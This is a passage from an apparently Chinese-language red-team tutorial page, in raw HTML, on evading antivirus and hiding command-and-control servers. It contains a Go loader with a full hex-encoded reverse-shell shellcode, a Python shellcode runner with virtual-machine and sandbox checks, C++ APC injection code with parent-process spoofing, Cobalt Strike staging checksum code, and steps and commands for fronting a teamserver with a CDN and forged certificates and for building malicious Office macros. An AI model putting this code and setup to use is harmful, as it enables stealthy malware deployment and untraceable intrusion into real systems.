        <span class="hljs-keyword">uintptr</span>(a),
        <span class="hljs-keyword">uintptr</span>(b),
        <span class="hljs-keyword">uintptr</span>(c),
        <span class="hljs-keyword">uintptr</span>(d))
    <span class="hljs-keyword">return</span> ret &gt; <span class="hljs-number">0</span>
}

<span class="hljs-keyword">func</span> Run(sc []<span class="hljs-keyword">byte</span>) {
    fly := <span class="hljs-keyword">func</span>() {}
    <span class="hljs-keyword">var</span> xx <span class="hljs-keyword">uint32</span>
    <span class="hljs-keyword">if</span> !aaa(unsafe.Pointer(*(**<span class="hljs-keyword">uintptr</span>)(unsafe.Pointer(&amp;fly))), unsafe.Sizeof(<span class="hljs-keyword">uintptr</span>(<span class="hljs-number">0</span>)), <span class="hljs-keyword">uint32</span>(<span class="hljs-number">0x40</span>), unsafe.Pointer(&amp;xx)) {
    }
    **(**<span class="hljs-keyword">uintptr</span>)(unsafe.Pointer(&amp;fly)) = *(*<span class="hljs-keyword">uintptr</span>)(unsafe.Pointer(&amp;sc))
    <span class="hljs-keyword">var</span> yy <span class="hljs-keyword">uint32</span>
    aaa(unsafe.Pointer(*(*<span class="hljs-keyword">uintptr</span>)(unsafe.Pointer(&amp;sc))), <span class="hljs-keyword">uintptr</span>(<span class="hljs-built_in">len</span>(sc)), <span class="hljs-keyword">uint32</span>(<span class="hljs-number">0x40</span>), unsafe.Pointer(&amp;yy))
    fly()
}

<span class="hljs-keyword">func</span> ScFromHex(scHex <span class="hljs-keyword">string</span>) []<span class="hljs-keyword">byte</span> {
    <span class="hljs-keyword">var</span> charcode []<span class="hljs-keyword">byte</span>
    charcode, _ = hex.DecodeString(<span class="hljs-keyword">string</span>(scHex))
    <span class="hljs-keyword">return</span> charcode
}
<span class="hljs-keyword">func</span> main() {
    check_language()
    check_file()
    check, _ := check_virtual()
    <span class="hljs-keyword">if</span> check == <span class="hljs-literal">true</span> {
        os.Exit(<span class="hljs-number">1</span>)
    }
    check_sandbox()
    sccode := ScFromHex(<span class="hljs-string">&quot;fc4883e4f0e8cc000000415141505251564831d265488b5260488b5218488b5220488b72504d31c9480fb74a4a4831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d0448b40208b48184901d050e3564d31c948ffc9418b34884801d64831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc02001a202f5eec7541544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5&quot;</span>)
    Run(sccode)
}
</code></pre>
<h6 id="&#x68C0;&#x6D4B;&#x4EE3;&#x7801;-python">&#x68C0;&#x6D4B;&#x4EE3;&#x7801;-python</h6>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> ctypes,base64,os,psutil,time
<span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> cpu_count


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_file</span><span class="hljs-params">()</span>:</span>
    vmfile=[
        <span class="hljs-string">&apos;C:\windows\System32\Drivers\Vmmouse.sys&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32\Drivers/vmtray.dll&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32\Drivers\VMToolsHook.dll&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32\Drivers/vmmousever.dll&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32\Drivers/vmhgfs.dll&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32\Drivers/vmGuestLib.dll&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32\Drivers\VBoxMouse.sys&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32\Drivers\VBoxGuest.sys&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32\Drivers\VBoxSF.sys&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32\Drivers\VBoxVideo.sys&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32/vboxdisp.dll&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32/vboxhook.dll&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32/vboxoglerrorspu.dll&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32/vboxoglpassthroughspu.dll&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32/vboxservice.exe&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32/vboxtray.exe&apos;</span>,
        <span class="hljs-string">&apos;C:\windows\System32\VBoxControl.exe&apos;</span>,
    ]
    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> vmfile:
        result=os.path.exists(data)
        <span class="hljs-keyword">if</span> result:
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>



<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_virtual</span><span class="hljs-params">()</span>:</span>
    r=os.popen(<span class="hljs-string">&apos;wmic path Win32_ComputerSystem get Model&apos;</span>)
    text = r.read()
    <span class="hljs-keyword">if</span> <span class="hljs-string">&apos;vmware&apos;</span> <span class="hljs-keyword">in</span> text:
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">numberOfCPU</span><span class="hljs-params">()</span>:</span>
    <span class="hljs-keyword">if</span> int(format(cpu_count())) &lt; <span class="hljs-number">4</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">physicalMemory</span><span class="hljs-params">()</span>:</span>
    data = psutil.virtual_memory()
    total = data.total  <span class="hljs-comment"># &#x603B;&#x5185;&#x5B58;,&#x5355;&#x4F4D;&#x4E3A;byte</span>
    n=int(total/<span class="hljs-number">1024</span>/<span class="hljs-number">1024</span>/<span class="hljs-number">1024</span>)+<span class="hljs-number">1</span>
    <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">4</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    r=numberOfCPU()+physicalMemory()+check_virtual()+check_file()
    print(r)
    <span class="hljs-keyword">if</span> r &lt; <span class="hljs-number">4</span>:
        exit()
    <span class="hljs-keyword">else</span>:
        buf = <span class="hljs-string">b&apos;/EiD5PDoyAAAAEFRQVBSUVZ&apos;</span>
        shellcode = base64.b64decode(buf)
        ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
        rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="hljs-number">0</span>, len(shellcode), <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(shellcode),len(shellcode))
        handle = ctypes.windll.kernel32.CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ctypes.c_uint64(rwxpage), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
        ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="hljs-number">-1</span>)
</code></pre>
<p>&#x5229;&#x7528;c&#x4EE3;&#x7801;&#x5224;&#x65AD;&#x662F;&#x5426;&#x662F;&#x865A;&#x62DF;&#x673A;&#x6216;&#x8005;&#x6C99;&#x76D2;</p>
<pre><code>\&#x53CD;&#x6C99;&#x76D2;VT\C++-CheckVM-Sandbox-master\CheckVM-Sandbox-master
</code></pre><h5 id="&#x53CD;&#x6C99;&#x7BB1;">&#x53CD;&#x6C99;&#x7BB1;</h5>
<p><a href="https://forum.butian.net/share/758" target="_blank">https://forum.butian.net/share/758</a></p>
<h4 id="apc&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;">APC&#x8FDB;&#x7A0B;&#x6CE8;&#x5165;</h4>
<pre><code class="lang-c++"><span class="hljs-comment">// Parent spoofing.cpp : &#x6B64;&#x6587;&#x4EF6;&#x5305;&#x542B; &quot;main&quot; &#x51FD;&#x6570;&#x3002;&#x7A0B;&#x5E8F;&#x6267;&#x884C;&#x5C06;&#x5728;&#x6B64;&#x5904;&#x5F00;&#x59CB;&#x5E76;&#x7ED3;&#x675F;&#x3002;</span>
<span class="hljs-comment">//</span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;TlHelp32.h&gt;</span></span>

<span class="hljs-function">DWORD <span class="hljs-title">getParentProcessID</span><span class="hljs-params">()</span>
</span>{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);
    PROCESSENTRY32 process = { <span class="hljs-number">0</span> };
    process.dwSize = <span class="hljs-keyword">sizeof</span>(process);

    <span class="hljs-keyword">if</span> (Process32First(snapshot, &amp;process))
    {
        <span class="hljs-keyword">do</span>
        {
            <span class="hljs-keyword">if</span> (!wcscmp(process.szExeFile, <span class="hljs-string">L&quot;explorer.exe&quot;</span>))
            {
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Find explorer failed!\n&quot;</span>);
                <span class="hljs-keyword">break</span>;
            }
        } <span class="hljs-keyword">while</span> (Process32Next(snapshot, &amp;process));
    }

    CloseHandle(snapshot);
    <span class="hljs-keyword">return</span> process.th32ProcessID;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellCode[] = <span class="hljs-string">&quot;\xfc\x48&quot;</span>;

    STARTUPINFOEXA sInfoEX;
    PROCESS_INFORMATION pInfo;
    SIZE_T sizeT;

    <span class="hljs-comment">//&#x6253;&#x5F00;explorer&#x8FDB;&#x7A0B;&#x83B7;&#x53D6;&#x5F53;&#x524D;&#x8FDB;&#x7A0B;&#x6240;&#x6709;&#x6743;&#x9650;</span>
    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">false</span>, getParentProcessID());

    <span class="hljs-comment">//&#x7528;0&#x586B;&#x5145;&#x6570;&#x7EC4;</span>
    ZeroMemory(&amp;sInfoEX, <span class="hljs-keyword">sizeof</span>(STARTUPINFOEXA));

    <span class="hljs-comment">//&#x521D;&#x59CB;&#x5316;&#x6307;&#x5B9A;&#x7684;&#x5C5E;&#x6027;&#x5217;&#x8868;,&#x521B;&#x5EFA;&#x8FDB;&#x7A0B;&#x548C;&#x7EBF;&#x7A0B;</span>
    InitializeProcThreadAttributeList(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;sizeT);

    <span class="hljs-comment">//&#x8BBE;&#x7F6E;&#x8FDB;&#x7A0B;&#x5C5E;&#x6027;&#x5E76;&#x4ECE;&#x5806;&#x4E2D;&#x5206;&#x914D;&#x5185;&#x5B58;</span>
    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), <span class="hljs-number">0</span>, sizeT);

    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;sizeT);

    <span class="hljs-comment">//&#x66F4;&#x65B0;&#x7528;&#x4E8E;&#x8FDB;&#x7A0B;&#x548C;&#x7EBF;&#x7A0B;&#x521B;&#x5EFA;&#x7684;&#x5C5E;&#x6027;&#x5217;&#x8868;&#x4E2D;&#x7684;&#x6307;&#x5B9A;&#x5C5E;&#x6027;</span>
    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, <span class="hljs-number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;expHandle, <span class="hljs-keyword">sizeof</span>(HANDLE), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);

    sInfoEX.StartupInfo.cb = <span class="hljs-keyword">sizeof</span>(STARTUPINFOEXA);

    CreateProcessA(<span class="hljs-string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>,
        <span class="hljs-literal">NULL</span>,
        <span class="hljs-literal">NULL</span>,
        <span class="hljs-literal">NULL</span>,
        TRUE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
        <span class="hljs-literal">NULL</span>,
        <span class="hljs-literal">NULL</span>,
        <span class="hljs-keyword">reinterpret_cast</span>&lt;LPSTARTUPINFOA&gt;(&amp;sInfoEX),
        &amp;pInfo);

    <span class="hljs-comment">//&#x5206;&#x914D;&#x5185;&#x5B58;</span>
    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    SIZE_T* lpNumberOfBytesWritten = <span class="hljs-number">0</span>;

    <span class="hljs-comment">//&#x5199;&#x5165;&#x5185;&#x5B58;</span>
    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, <span class="hljs-keyword">sizeof</span>(shellCode), lpNumberOfBytesWritten);

    <span class="hljs-comment">//APC&#x8C03;&#x7528;</span>
    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, <span class="hljs-literal">NULL</span>);

    <span class="hljs-comment">//&#x542F;&#x52A8;&#x7EBF;&#x7A0B;</span>
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hThread);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>&#x5C06;shellcode&#x6CE8;&#x5165;&#x5230;notepad.exe&#x4E2D;</p>
<p><a href="https://imgse.com/i/pp7TMNt" target="_blank"><img src="https://s1.ax1x.com/2023/04/08/pp7TMNt.png" alt="pp7TMNt.png"></a></p>
<h4 id="&#x53CD;&#x8C03;&#x8BD5;">&#x53CD;&#x8C03;&#x8BD5;</h4>
<pre><code>https://mp.weixin.qq.com/s?__biz=Mzg3Mzg1OTYyMQ==&amp;mid=2247486058&amp;idx=1&amp;sn=2af8853e3e8437044e76e898c250ab78&amp;source=41#wechat_redirect
</code></pre><p>&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x91C7;&#x7528;&#x5176;&#x4E2D;&#x7684;&#x7B2C;&#x56DB;&#x79CD;&#x53CD;&#x8C03;&#x8BD5;</p>
<p><a href="https://imgse.com/i/pp7TdNq" target="_blank"><img src="https://s1.ax1x.com/2023/04/08/pp7TdNq.png" alt="pp7TdNq.png"></a></p>
<h4 id="&#x4E8C;&#x5F00;cs&#x53BB;&#x9664;&#x7279;&#x5F81;">&#x4E8C;&#x5F00;CS&#x53BB;&#x9664;&#x7279;&#x5F81;</h4>
<pre><code>&#x76EE;&#x6807;&#x8FDB;&#x884C;&#x4E0A;&#x7EBF;&#x65F6;&#xFF0C;&#x4F1A;&#x8BBF;&#x95EE;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x5730;&#x5740;(&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x7684;&#x516C;&#x7F51;CS&#x5730;&#x5740;&#x662F;&#xFF1A;124.70.20.10)&#xFF0C;&#x4F1A;&#x8BBF;&#x95EE;http://124.70.20.10/xXBd/&#xFF0C;&#x540E;&#x9762;&#x56DB;&#x4F4D;&#x662F;&#x5B57;&#x6BCD;&#x7EC4;&#x5408;&#xFF0C;&#x6839;&#x636E;&#x4E00;&#x4E2A;checksum8&#x7B97;&#x6CD5;
&#x5982;&#x679C;&#x4F60;&#x7684;&#x662F;32&#x4F4D;&#x5219;&#x662F;&#xFF0C;92
64&#x4F4D;&#x5219;&#x662F;93
</code></pre><pre><code class="lang-java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EchoTest</span></span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">checksum8</span><span class="hljs-params">(String text)</span></span>{
        <span class="hljs-keyword">if</span>(text.length() &lt; <span class="hljs-number">4</span>){
            <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>;
        }
        text = text.replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);
        <span class="hljs-keyword">long</span> sum = <span class="hljs-number">0L</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;text.length();i++){
            sum += text.charAt(i);
        }
        <span class="hljs-keyword">return</span> sum % <span class="hljs-number">256</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>{
        System.out.println(checksum8(<span class="hljs-string">&quot;F5vk&quot;</span>));
    }


}
</code></pre>
<p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/106931/12/27390/27527/647f3756F361acb3e/ae79d40da1493a6b.jpg" alt="image.png"></p>
<h3 id="&#x9632;&#x6EAF;&#x6E90;">&#x9632;&#x6EAF;&#x6E90;</h3>
<pre><code>CDN&#x8282;&#x70B9;-&#x9632;&#x62C9;&#x9ED1;
SSL&#x7279;&#x5F81;-&#x9632;&#x7279;&#x5F81;
OSS&#x5B58;&#x50A8;-&#x9632;&#x6D41;&#x91CF;
</code></pre><h4 id="cdn&#x8282;&#x70B9;">CDN&#x8282;&#x70B9;</h4>
<p>&#x5728;<a href="https://www.godaddy.com/en-sg&#x4E0A;&#x4E70;&#x4E00;&#x4E2A;&#x57DF;&#x540D;" target="_blank">https://www.godaddy.com/en-sg&#x4E0A;&#x4E70;&#x4E00;&#x4E2A;&#x57DF;&#x540D;</a></p>
<p>&#x7136;&#x540E;&#x5728;cloudflare&#x4E0A;&#x6DFB;&#x52A0;&#x57DF;&#x540D;</p>
<p><a href="https://imgse.com/i/ppLIWod" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLIWod.png" alt="ppLIWod.png"></a></p>
<p><a href="https://imgse.com/i/ppLIjFs" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLIjFs.png" alt="ppLIjFs.png"></a></p>
<p>&#x5728;godaddy&#x4E0A;&#x589E;&#x52A0;dns&#x670D;&#x52A1;&#x5668;&#x4E3A;cloudflare&#x7684;dns&#x670D;&#x52A1;&#x5668;</p>
<p><a href="https://imgse.com/i/ppLIxWq" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLIxWq.png" alt="ppLIxWq.png"></a></p>
<p>&#x5728;&#x8FD9;&#x91CC;&#x5F00;&#x542F;&#x8FD9;&#x4E24;&#x4E2A;</p>
<p><a href="https://imgse.com/i/ppLoZf1" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLoZf1.png" alt="ppLoZf1.png"></a></p>
<p>&#x6700;&#x540E;&#x4E00;&#x5B9A;&#x8981;&#x70B9;&#x51FB;&quot;&#x68C0;&#x67E5;&#x540D;&#x79F0;&#x670D;&#x52A1;&#x5668;&quot;</p>
<p>&#x6210;&#x529F;&#x4E4B;&#x540E;&#x6211;&#x4EEC;&#x5728;<a href="https://ping.chinaz.com/&#xFF0C;&#x6D4B;&#x8BD5;&#x6211;&#x4EEC;&#x7684;&#x57DF;&#x540D;&#x662F;&#x5426;&#x914D;&#x7F6E;&#x4E86;CDN" target="_blank">https://ping.chinaz.com/&#xFF0C;&#x6D4B;&#x8BD5;&#x6211;&#x4EEC;&#x7684;&#x57DF;&#x540D;&#x662F;&#x5426;&#x914D;&#x7F6E;&#x4E86;CDN</a></p>
<p><a href="https://imgse.com/i/ppLTg5d" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLTg5d.png" alt="ppLTg5d.png"></a></p>
<p>&#x6211;&#x7684;&#x670D;&#x52A1;&#x5668;&#x662F;129.226.92.29&#xFF0C;&#x8FD9;&#x91CC;&#x53EA;&#x6709;&#x4E24;&#x4E2A;&#x662F;&#x771F;&#x5B9E;&#x7684;&#xFF08;&#x65B0;&#x52A0;&#x5761;&#x817E;&#x8BAF;&#x4E91;&#xFF09;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x662F;CDN</p>
<p>&#x53EF;&#x4EE5;ping&#x901A;&#x540E;&#xFF0C;&#x5728;<a href="https://github.com/threatexpress/malleable-c2&#xFF0C;&#x627E;&#x5230;&#x5BF9;&#x5E94;cs&#x7248;&#x672C;&#x7684;&#x6A21;&#x677F;" target="_blank">https://github.com/threatexpress/malleable-c2&#xFF0C;&#x627E;&#x5230;&#x5BF9;&#x5E94;cs&#x7248;&#x672C;&#x7684;&#x6A21;&#x677F;</a></p>
<p>&#x6BD4;&#x5982;&#x6211;&#x7684;&#x662F;4.7<a href="https://imgse.com/i/ppLTIr8" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLTIr8.png" alt="ppLTIr8.png"></a></p>
<p>&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#xFF0C;&#x4FEE;&#x6539;&#x91CC;&#x9762;&#x7684;http-get&#x548C;http-post&#xFF0C;&#x4F8B;&#x5982;</p>
<p><a href="https://imgse.com/i/ppL7SqU" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppL7SqU.png" alt="ppL7SqU.png"></a><a href="https://imgse.com/i/ppL79ZF" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppL79ZF.png" alt="ppL79ZF.png"></a></p>
<p>&#x8FD9;&#x91CC;&#x8BBE;&#x7F6E;&#x597D;&#x540E;&#xFF0C;&#x4FDD;&#x5B58;&#x653E;&#x5728;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6267;&#x884C;(&#x540D;&#x5B57;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;)</p>
<pre><code>./teamserver 129.226.92.29 password 4.7config.profile
</code></pre><p>&#x542F;&#x52A8;&#x6210;&#x529F;&#x540E;&#x914D;&#x7F6E;http&#x548C;https&#x7684;&#x76D1;&#x542C;&#x5668;&#xFF0C;&#x7136;&#x540E;&#x751F;&#x6210;payload stageless exe</p>
<p><a href="https://imgse.com/i/ppL7ZM6" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppL7ZM6.png" alt="ppL7ZM6.png"></a><a href="https://imgse.com/i/ppL71JA" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppL71JA.png" alt="ppL71JA.png"></a></p>
<p>&#x8FD9;&#x91CC;&#x7684;&#x7AEF;&#x53E3;&#x5FC5;&#x987B;&#x662F;&#x7279;&#x5236;&#x7684;</p>
<pre><code>http:   80.8080.8880.2052.2082.2086.2095
https:   443.2053.2083.2087.2096.8443
</code></pre><p>&#x7136;&#x540E;&#x751F;&#x6210;exe&#xFF0C;&#x5FC5;&#x987B;&#x5728;&#x672C;&#x5730;ping&#x901A;&#x4E4B;&#x540E;&#x624D;&#x53EF;&#x80FD;&#x4E0A;&#x7EBF;</p>
<p><a href="https://imgse.com/i/ppL7tL8" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppL7tL8.png" alt="ppL7tL8.png"></a></p>
<p>&#x8FD0;&#x884C;exe&#xFF0C;&#x7528;tcpview&#x67E5;&#x770B;&#x901A;&#x4FE1;&#x7AEF;&#x53E3;&#xFF0C;&#x53D1;&#x73B0;&#x662F;CDN</p>
<p><a href="https://imgse.com/i/ppL76yV" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppL76yV.png" alt="ppL76yV.png"></a></p>
<h4 id="ssl&#x8BC1;&#x4E66;">SSL&#x8BC1;&#x4E66;</h4>
<p>1.&#x521B;&#x5EFA;&#x8BC1;&#x4E66;&#xFF08;SSL-&#x6E90;&#x670D;&#x52A1;&#x5668;&#xFF09;</p>
<p><a href="https://imgse.com/i/ppLHSSI" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLHSSI.png" alt="ppLHSSI.png"></a><a href="https://imgse.com/i/ppLHplt" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLHplt.png" alt="ppLHplt.png"></a></p>
<p>&#x628A;&#x6E90;&#x8BC1;&#x4E66;&#x548C;&#x79C1;&#x94A5;&#x4FDD;&#x5B58;&#x4E3A;server.pem&#x548C;server.key</p>
<p><a href="https://imgse.com/i/ppLHCOf" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLHCOf.png" alt="ppLHCOf.png"></a></p>
<p>2.&#x751F;&#x6210;&#x8BC1;&#x4E66;&#x6587;&#x4EF6;</p>
<p>&#x8BBE;&#x7F6E;&#x9875;&#x9762;&#x89C4;&#x5219;</p>
<p><a href="https://imgse.com/i/ppLH8k4" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLH8k4.png" alt="ppLH8k4.png"></a></p>
<p>&#x4FDD;&#x5B58;CSR&amp;&#x5BC6;&#x94A5;&#xFF08;server.pem&amp;server.key&#xFF09;</p>
<p>&#x4E0A;&#x4F20;&#x6211;&#x4EEC;&#x7684;server.pem&amp;server.key</p>
<pre><code>openssl pkcs12 -export -in server.pem -inkey server.key -out www.shazambatman.xyz.p12 -name www.shazambatman.xyz -passout pass:123456

keytool -importkeystore -deskstorepass 123456 -deskkeypass 123456 -deskkeystore www.shazambatman.xyz.store -srckeystore www.shazambatman.xyz.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias www.shazambatman.xyz
</code></pre><p>&#x6253;&#x5F00;teamserver</p>
<p><a href="https://imgse.com/i/ppLb3KP" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLb3KP.png" alt="ppLb3KP.png"></a><a href="https://imgse.com/i/ppLb8Df" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppLb8Df.png" alt="ppLb8Df.png"></a></p>
<p>&#x518D;&#x628A;&#x8FD9;&#x4E2A;&#x66FF;&#x6362;&#x5230;&#x670D;&#x52A1;&#x5668;&#x91CD;&#x542F;&#x5C31;&#x751F;&#x6548;&#x4E86;</p>
<h4 id="oss&#x5B58;&#x50A8;">OSS&#x5B58;&#x50A8;</h4>
<p><a href="https://oss.console.aliyun.com/bucket/oss-cn-beijing/batmanfuture/object" target="_blank">https://oss.console.aliyun.com/bucket/oss-cn-beijing/batmanfuture/object</a></p>
<p>&#x4E0A;&#x4F20;&#x6587;&#x4EF6;</p>
<h3 id="office&#x5957;&#x4EF6;">Office&#x5957;&#x4EF6;</h3>
<p><a href="https://github.com/outflanknl/EvilClippy" target="_blank">https://github.com/outflanknl/EvilClippy</a></p>
<pre><code>&quot;C:\Program Files (x86)\Microsoft Visual Studio\Shared\Packages\Microsoft.CodeDom.Providers.DotNetCompilerPlatform.2.0.1\tools\Roslyn45\csc.exe&quot; /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs
</code></pre><p><a href="https://imgse.com/i/ppOEDQP" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppOEDQP.png" alt="ppOEDQP.png"></a></p>
<p>1.vba</p>
<pre><code class="lang-vb"><span class="hljs-keyword">Sub</span> Hello()
<span class="hljs-keyword">Dim</span> X
X-MsgBox(<span class="hljs-string">&quot;Hello VBS&quot;</span>)
</code></pre>
<pre><code>BadAssMacrosx64.exe -i payload.bin -w doc -p no -e classic -c 5 -o 1.vba
</code></pre><p><a href="https://imgse.com/i/ppOn9gA" target="_blank"><img src="https://s1.ax1x.com/2023/04/11/ppOn9gA.png" alt="ppOn9gA.png"></a></p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                
                <a href="antikillinter.html" class="navigation navigation-next navigation-unique" aria-label="Next page: 反病毒/免杀面试题">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
